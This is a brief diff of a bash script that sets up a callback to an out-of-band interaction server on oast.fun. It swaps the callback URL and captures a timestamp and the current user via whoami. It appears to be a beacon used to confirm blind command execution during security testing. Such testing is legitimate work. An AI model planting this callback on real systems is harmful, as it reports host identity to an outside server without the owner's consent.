@@ -1,6 +1,6 @@
 #!/bin/bash
 # Callback to collaborator server
-COLLAB_URL="http://nduaepxoixrcimkbeehgl9a30b90uc1t5.oast.fun"
+COLLAB_URL="https://xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun"
 TIMESTAMP=$(date +%Y-%m-%d_%H-%M-%S)
 
 WHOAMI=$(whoami)
